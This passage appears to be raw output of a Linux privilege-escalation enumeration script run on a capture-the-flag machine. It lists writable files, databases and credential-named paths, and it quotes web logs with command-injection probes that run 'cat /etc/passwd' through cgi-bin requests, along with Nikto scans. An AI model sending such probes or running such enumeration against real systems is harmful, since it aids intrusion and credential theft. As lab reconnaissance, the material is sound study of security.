-rw-r--r--. 1 root root 3986 May 13  2019 /usr/share/help/ca/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 3215 May 13  2019 /usr/share/help/ca/gnome-help/backup-what.page
-rw-r--r--. 1 root root 2824 May 13  2019 /usr/share/help/ca/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1685 May 13  2019 /usr/share/help/ca/gnome-help/backup-why.page
-rw-r--r--. 1 root root 2363 May 13  2019 /usr/share/help/cs/gnome-help/backup-check.page
-rw-r--r--. 1 root root 2601 May 13  2019 /usr/share/help/cs/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 2883 May 13  2019 /usr/share/help/cs/gnome-help/backup-how.page
-rw-r--r--. 1 root root 1858 May 13  2019 /usr/share/help/cs/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 3996 May 13  2019 /usr/share/help/cs/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 3127 May 13  2019 /usr/share/help/cs/gnome-help/backup-what.page
-rw-r--r--. 1 root root 2857 May 13  2019 /usr/share/help/cs/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1892 May 13  2019 /usr/share/help/cs/gnome-help/backup-why.page
-rw-r--r--. 1 root root 1856 May 13  2019 /usr/share/help/da/gnome-help/backup-check.page
-rw-r--r--. 1 root root 2040 May 13  2019 /usr/share/help/da/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 2397 May 13  2019 /usr/share/help/da/gnome-help/backup-how.page
-rw-r--r--. 1 root root 1362 May 13  2019 /usr/share/help/da/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 3311 May 13  2019 /usr/share/help/da/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 2546 May 13  2019 /usr/share/help/da/gnome-help/backup-what.page
-rw-r--r--. 1 root root 2309 May 13  2019 /usr/share/help/da/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1302 May 13  2019 /usr/share/help/da/gnome-help/backup-why.page
-rw-r--r--. 1 root root 3251 May 13  2019 /usr/share/help/de/gnome-help/backup-check.page
-rw-r--r--. 1 root root 3436 May 13  2019 /usr/share/help/de/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 3818 May 13  2019 /usr/share/help/de/gnome-help/backup-how.page
-rw-r--r--. 1 root root 2735 May 13  2019 /usr/share/help/de/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 4939 May 13  2019 /usr/share/help/de/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 4021 May 13  2019 /usr/share/help/de/gnome-help/backup-what.page
-rw-r--r--. 1 root root 3706 May 13  2019 /usr/share/help/de/gnome-help/backup-where.page
-rw-r--r--. 1 root root 2649 May 13  2019 /usr/share/help/de/gnome-help/backup-why.page
-rw-r--r--. 1 root root 4349 May 13  2019 /usr/share/help/el/gnome-help/backup-check.page
-rw-r--r--. 1 root root 5132 May 13  2019 /usr/share/help/el/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 5562 May 13  2019 /usr/share/help/el/gnome-help/backup-how.page
-rw-r--r--. 1 root root 3614 May 13  2019 /usr/share/help/el/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 6883 May 13  2019 /usr/share/help/el/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 6104 May 13  2019 /usr/share/help/el/gnome-help/backup-what.page
-rw-r--r--. 1 root root 4888 May 13  2019 /usr/share/help/el/gnome-help/backup-where.page
-rw-r--r--. 1 root root 3678 May 13  2019 /usr/share/help/el/gnome-help/backup-why.page
-rw-r--r--. 1 root root 2941 May 13  2019 /usr/share/help/es/gnome-help/backup-check.page
-rw-r--r--. 1 root root 3265 May 13  2019 /usr/share/help/es/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 3592 May 13  2019 /usr/share/help/es/gnome-help/backup-how.page
-rw-r--r--. 1 root root 2404 May 13  2019 /usr/share/help/es/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 4639 May 13  2019 /usr/share/help/es/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 3692 May 13  2019 /usr/share/help/es/gnome-help/backup-what.page
-rw-r--r--. 1 root root 3418 May 13  2019 /usr/share/help/es/gnome-help/backup-where.page
-rw-r--r--. 1 root root 2426 May 13  2019 /usr/share/help/es/gnome-help/backup-why.page
-rw-r--r--. 1 root root 2335 May 13  2019 /usr/share/help/fi/gnome-help/backup-check.page
-rw-r--r--. 1 root root 2562 May 13  2019 /usr/share/help/fi/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 2911 May 13  2019 /usr/share/help/fi/gnome-help/backup-how.page
-rw-r--r--. 1 root root 1814 May 13  2019 /usr/share/help/fi/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 3903 May 13  2019 /usr/share/help/fi/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 2995 May 13  2019 /usr/share/help/fi/gnome-help/backup-what.page
-rw-r--r--. 1 root root 2974 May 13  2019 /usr/share/help/fi/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1896 May 13  2019 /usr/share/help/fi/gnome-help/backup-why.page
-rw-r--r--. 1 root root 4131 May 13  2019 /usr/share/help/fr/gnome-help/backup-check.page
-rw-r--r--. 1 root root 4388 May 13  2019 /usr/share/help/fr/gnome-help/backup-frequency.page

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /etc/pki/nssdb/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)                                                                      
Found: /etc/pki/nssdb/cert9.db: SQLite 3.x database, last written using SQLite version 0
Found: /etc/pki/nssdb/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found: /etc/pki/nssdb/key4.db: SQLite 3.x database, last written using SQLite version 0
Found: /etc/pki/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found: /home/dwight/.local/share/containers/storage/libpod/bolt_state.db: data
Found: /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3026000
Found: /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3026000
Found: /var/lib/dnf/history.sqlite: SQLite 3.x database, last written using SQLite version 3026000
Found: /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3026000
Found: /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3026000

 -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
                                                                                                                                                           
 -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
                                                                                                                                                           
 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
                                                                                                                                                           
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)
                                                                                                                                                           
 -> Extracting tables from /var/lib/dnf/history.sqlite (limit 20)
                                                                                                                                                           




 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                                                                                           
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                                                           

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                 
total 4.0K
drwxr-xr-x.  4 root root   33 Nov 11 23:58 .
drwxr-xr-x. 22 root root 4.0K Jan 14 05:58 ..
drwxr-xr-x.  2 root root    6 Nov 11 23:58 cgi-bin
drwxr-xr-x.  4 root root   38 Nov 11 23:58 html

/var/www/cgi-bin:
total 0
drwxr-xr-x. 2 root root  6 Nov 11 23:58 .

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r--. 1 root root 172 Dec 22 08:33 /boot/.vmlinuz-4.18.0-348.7.1.el8_5.x86_64.hmac                                                                   
-rw------- 1 root root 0 Apr 21 07:08 /run/lsm/ipc/.lsmd-ipc-lock
-rw-r--r-- 1 root root 0 Apr 21 07:08 /run/initramfs/.need_shutdown
-rw-r--r--. 1 root root 18 Jul 27  2021 /etc/skel/.bash_logout
-rw-r--r--. 1 root root 129 Dec 21 15:10 /etc/selinux/targeted/.policy.sha512
-rw-------. 1 root root 0 Jul  3  2021 /etc/.pwd.lock
-rw-------. 1 root root 147 Aug  7  2018 /etc/insights-client/.exp.sed
-rw-------. 1 root root 80626 Dec 11  2018 /etc/insights-client/.fallback.json
-rw-------. 1 root root 811 Dec 11  2018 /etc/insights-client/.fallback.json.asc
-rw-r--r--. 1 root root 208 Jan 14 04:52 /etc/.updated
-rw-r--r--. 1 root root 0 Jul  3  2021 /var/lib/rpm/.rpm.lock
-rw-r--r--. 1 root root 0 Jul  3  2021 /var/lib/flatpak/.changed
-rw-r--r-- 1 root root 208 Jan 14 04:52 /var/.updated
-rw-r--r--. 1 root root 165 Jun  4  2019 /usr/lib/modules/4.18.0-80.el8.x86_64/.vmlinuz.hmac
-rw-r--r--. 1 root root 172 Dec 22 08:33 /usr/lib/modules/4.18.0-348.7.1.el8_5.x86_64/.vmlinuz.hmac
-rw-r--r-- 1 root root 0 Sep 29  2021 /usr/lib/dracut/modules.d/99squash/.shchkdir
-rw-r--r-- 1 root root 88 Oct 26  1985 /usr/lib/node_modules/node-gyp/.jshintrc
-rw-r--r-- 1 root root 62 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/ajv/scripts/.eslintrc.yml
-rw-r--r-- 1 root root 439 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/ajv/.tonic_example.js
-rw-r--r-- 1 root root 91 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/aws4/.travis.yml
-rw-r--r-- 1 root root 43 Jun  8  2012 /usr/lib/node_modules/node-gyp/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 286 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/extend/.editorconfig
-rw-r--r-- 1 root root 397 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/extend/.eslintrc
-rw-r--r-- 1 root root 4096 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/extend/.jscs.json
-rw-r--r-- 1 root root 6899 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/extend/.travis.yml
-rw-r--r-- 1 root root 562 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/fast-json-stable-stringify/.eslintrc.yml
-rw-r--r-- 1 root root 111 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/fast-json-stable-stringify/.travis.yml
-rw-r--r-- 1 root root 113 Apr 21  2016 /usr/lib/node_modules/node-gyp/node_modules/getpass/.travis.yml
-rw-r--r-- 1 root root 178 Aug 24  2017 /usr/lib/node_modules/node-gyp/node_modules/http-signature/.dir-locals.el
-rw-r--r-- 1 root root 48 Dec 10  2015 /usr/lib/node_modules/node-gyp/node_modules/isarray/.travis.yml
-rw-r--r-- 1 root root 1147 Apr  6  2014 /usr/lib/node_modules/node-gyp/node_modules/isstream/.jshintrc
-rw-r--r-- 1 root root 150 Apr  6  2014 /usr/lib/node_modules/node-gyp/node_modules/isstream/.travis.yml
-rw-r--r-- 1 root root 630 May  8  2018 /usr/lib/node_modules/node-gyp/node_modules/json-schema-traverse/.eslintrc.yml
-rw-r--r-- 1 root root 108 May  8  2018 /usr/lib/node_modules/node-gyp/node_modules/json-schema-traverse/.travis.yml
-rw-r--r-- 1 root root 91 May  8  2018 /usr/lib/node_modules/node-gyp/node_modules/json-schema-traverse/spec/.eslintrc.yml
-rw-r--r-- 1 root root 116 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/minimist/.travis.yml
-rw-r--r-- 1 root root 134 Nov 12  2015 /usr/lib/node_modules/node-gyp/node_modules/nopt/.travis.yml
-rw-r--r-- 1 root root 193 Jan  3  2017 /usr/lib/node_modules/node-gyp/node_modules/performance-now/.tm_properties
-rw-r--r-- 1 root root 65 Feb 19  2017 /usr/lib/node_modules/node-gyp/node_modules/performance-now/.travis.yml
-rw-r--r-- 1 root root 399 Jul 26  2017 /usr/lib/node_modules/node-gyp/node_modules/qs/.editorconfig
-rw-r--r-- 1 root root 5 Dec 23  2015 /usr/lib/node_modules/node-gyp/node_modules/qs/.eslintignore
-rw-r--r-- 1 root root 554 May  2  2018 /usr/lib/node_modules/node-gyp/node_modules/qs/.eslintrc
-rw-r--r-- 1 root root 348 Sep  9  2017 /usr/lib/node_modules/node-gyp/node_modules/qs/test/.eslintrc
-rw-r--r-- 1 root root 991 Oct 26  1985 /usr/lib/node_modules/node-gyp/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 189 Apr 21  2016 /usr/lib/node_modules/node-gyp/node_modules/sshpk/.travis.yml
-rw-r--r-- 1 root root 245 Jan 10 07:20 /usr/lib/node_modules/npm/.licensee.json
-rw-r--r-- 1 root root 3274 Jan 10 07:20 /usr/lib/node_modules/npm/.mailmap
-rw-r--r-- 1 root root 0 Oct 14  2021 /usr/lib/node_modules/npm/.npmrc
-rw-r--r-- 1 root root 269 Jan 10 07:20 /usr/lib/node_modules/npm/.travis.yml
-rw-r--r-- 1 root root 59 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/JSONStream/.travis.yml
-rw-r--r-- 1 root root 309 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/agent-base/.travis.yml
-rw-r--r-- 1 root root 43 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/archy/.travis.yml
-rw-r--r-- 1 root root 1308 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/are-we-there-yet/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 59 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/aws4/.travis.yml
-rw-r--r-- 1 root root 48 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/builtins/.travis.yml
-rw-r--r-- 1 root root 1160 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/color-name/.eslintrc.json
-rw-r--r-- 1 root root 43 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 1308 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/concat-stream/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 46 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 185 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 276 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/define-properties/.editorconfig
-rw-r--r-- 1 root root 4108 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/define-properties/.jscs.json
-rw-r--r-- 1 root root 6986 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/define-properties/.travis.yml
-rw-r--r-- 1 root root 111 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/dezalgo/.travis.yml
-rw-r--r-- 1 root root 65 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/duplexify/.travis.yml
-rw-r--r-- 1 root root 1308 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/duplexify/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 505 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/encoding/.travis.yml
-rw-r--r-- 1 root root 179 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/err-code/.editorconfig
-rw-r--r-- 1 root root 127 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/err-code/.eslintrc.json
-rw-r--r-- 1 root root 54 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/err-code/.travis.yml
grep: write error: Broken pipe
grep: write error: Broken pipe

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-rw-r-- 1 dwight dwight 5498 Apr 21 10:04 /var/tmp/dnf-dwight-1iw6tkrd/dnf.log                                                                          
-rw-rw-r-- 1 dwight dwight 1392 Apr 21 10:04 /var/tmp/dnf-dwight-1iw6tkrd/dnf.librepo.log
-rw-rw-r-- 1 dwight dwight 174 Apr 21 10:04 /var/tmp/dnf-dwight-1iw6tkrd/dnf.rpm.log
-rw-rw-r-- 1 dwight dwight 2 Apr 21 10:04 /var/tmp/dnf-dwight-1iw6tkrd/expired_repos.json
-rw-rw-r-- 1 dwight dwight 180 Apr 21 10:04 /var/tmp/dnf-dwight-1iw6tkrd/hawkey.log

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                               
/dev/mqueue                                                                                                                                                
/dev/shm
/home/dwight
/run/user/1004
/run/user/1004/containers
/run/user/1004/dbus-1
/run/user/1004/dbus-1/services
/run/user/1004/gnupg
/run/user/1004/gvfs
/run/user/1004/libpod
/run/user/1004/pulse
/run/user/1004/pulse/pid
/run/user/1004/systemd
/tmp
/tmp/.esd-1004
/tmp/tmux-1004
/var/tmp
/var/tmp/dnf-dwight-1iw6tkrd
/var/tmp/dnf-dwight-1iw6tkrd/dnf.librepo.log
/var/tmp/dnf-dwight-1iw6tkrd/dnf.log
/var/tmp/dnf-dwight-1iw6tkrd/dnf.rpm.log
/var/tmp/dnf-dwight-1iw6tkrd/expired_repos.json
/var/tmp/dnf-dwight-1iw6tkrd/hawkey.log
#)You_can_write_even_more_files_inside_last_directory

/var/tmp/dnf-dwight-1iw6tkrd/locks/f3ffd081f26ebb3234b892cdd093522ea5ce17cc

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                               
  Group dwight:                                                                                                                                            
/var/tmp/dnf-dwight-1iw6tkrd/dnf.log                                                                                                                       
/var/tmp/dnf-dwight-1iw6tkrd/dnf.librepo.log
/var/tmp/dnf-dwight-1iw6tkrd/dnf.rpm.log
/var/tmp/dnf-dwight-1iw6tkrd/expired_repos.json
/var/tmp/dnf-dwight-1iw6tkrd/hawkey.log

╔══════════╣ Searching passwords in history files
 * @licstart The following is the entire license notice for the                                                                                            
 * @licend The above is the entire license notice for the
 * @licstart The following is the entire license notice for the
 * @licend The above is the entire license notice for the
 * @licstart The following is the entire license notice for the
 * @licend The above is the entire license notice for the

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/authselect/password-auth                                                                                                                              
/etc/brlapi.key
/etc/pam.d/gdm-password
/etc/pam.d/password-auth
/etc/pki/tls/private/localhost.key
/etc/trusted-key.key
/etc/unbound/root.key
/opt/Rocket.Chat/programs/server/node_modules/node-gyp/test/fixtures/server.key
/opt/Rocket.Chat/programs/server/npm/node_modules/agenda/node_modules/mongodb/lib/core/auth/mongo_credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/lib/credentials
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKeyOpenSSL.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKey.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKeyPassphrase.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKey.pem
  #)There are more creds/passwds files in the previous parent folder

/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/chainable_temporary_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/chainable_temporary_credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/cognito_identity_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/cognito_identity_credentials.js
  #)There are more creds/passwds files in the previous parent folder

/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/ec2_metadata_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/ec2_metadata_credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/ecs_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/ecs_credentials.js
  #)There are more creds/passwds files in the previous parent folder

/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/process_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/process_credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/remote_credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/aws-sdk/lib/credentials/remote_credentials.js
  #)There are more creds/passwds files in the previous parent folder

/opt/Rocket.Chat/programs/server/npm/node_modules/blockstack/docs/classes/passworderror.html
/opt/Rocket.Chat/programs/server/npm/node_modules/caniuse-lite/data/features/credential-management.js
/opt/Rocket.Chat/programs/server/npm/node_modules/caniuse-lite/data/features/passwordrules.js
/opt/Rocket.Chat/programs/server/npm/node_modules/gcs-resumable-upload/node_modules/agent-base/test/ssl-cert-snakeoil.key
/opt/Rocket.Chat/programs/server/npm/node_modules/gcs-resumable-upload/node_modules/google-auth-library/build/src/auth/credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/gcs-resumable-upload/node_modules/google-auth-library/build/src/auth/credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/googleapis/node_modules/google-auth-library/build/src/auth/credentials.d.ts
/opt/Rocket.Chat/programs/server/npm/node_modules/googleapis/node_modules/google-auth-library/build/src/auth/credentials.js
/opt/Rocket.Chat/programs/server/npm/node_modules/googleapis/node_modules/google-auth-library/build/src/auth/credentials.js.map
/opt/Rocket.Chat/programs/server/npm/node_modules/google-auth-library/build/src/auth/credentials.d.ts

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                           
╔══════════╣ Searching passwords inside logs (limit 70)
10.10.14.11 - - [21/Apr/2022:07:11:40 -0400] "GET /cgi-bin/excite;IFS=\\\"$\\\";/bin/cat /etc/passwd" 400 226 "-" "-"                                      
10.10.14.11 - - [21/Apr/2022:07:12:15 -0400] "GET /cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download" 400 226 "-" "-"
10.10.14.11 - - [21/Apr/2022:07:13:16 -0400] "GET /cgi-bin/.htpasswd HTTP/1.1" 403 199 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002733)"
10.10.14.11 - - [21/Apr/2022:07:13:17 -0400] "GET /.htpasswd HTTP/1.1" 403 199 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002739)"

LINKS TO THIS PAGE
Paper - Writeup
